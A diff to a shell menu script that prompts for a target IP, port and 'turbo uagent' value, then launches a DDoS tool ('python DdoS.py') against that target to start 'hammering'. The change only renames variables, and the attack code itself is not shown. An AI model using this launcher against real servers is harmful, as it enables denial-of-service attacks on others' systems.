@@ -62,22 +62,22 @@ fi
 
 if [ $no = '2' ]
 then
-read -p "IP Server/DNS LOOKUP:" 3782
-read -p "The Port recomen(80):" 177
-read -p "the turbo uagent recomen(135):" 293
+read -p "IP Server/DNS LOOKUP:" xinen
+read -p "The Port recomen(80):" xintext
+read -p "the turbo uagent recomen(135):" xingex
 echo "waiting..."
 sleep 4
-echo "checking IP ($3782)"
+echo "checking IP ($xinen)"
 sleep 4
-echo "checking Port ($177)"
+echo "checking Port ($xintext)"
 sleep 4
-echo "checking Turbo Uagent ($293)"
+echo "checking Turbo Uagent ($xingex)"
 sleep 4
 echo "waiting..."
 sleep 3
 echo "try to starting hammering..."
 sleep 5
-python DdoS.py -s $3782 -p $177 -t $293
+python DdoS.py -s $xinen -p $xintext -t $xingex
 fi
 
 if [ $no = '3' ]
